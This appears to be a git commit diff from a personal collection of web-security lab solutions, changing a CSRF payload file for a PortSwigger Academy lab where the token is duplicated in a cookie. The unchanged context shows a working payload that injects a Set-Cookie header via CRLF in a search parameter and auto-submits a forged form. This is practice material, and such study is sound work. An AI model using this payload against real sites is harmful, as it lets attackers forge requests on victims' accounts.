318048e5ebd2bcb548d0dd67ceb46b7cf337449e
senior <jedi>
2023-06-27 12:31:59 +0530

    yet

--- CSRF/CSRF where token is duplicated in cookie/payload.js
+++ CSRF/CSRF where token is duplicated in cookie/payload.js
@@ -8,7 +8,7 @@
     <img src="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()"/>
     </script>
 </body>
-</html>
+</html>?
 /*
 
 find a injection point for csrf cookie
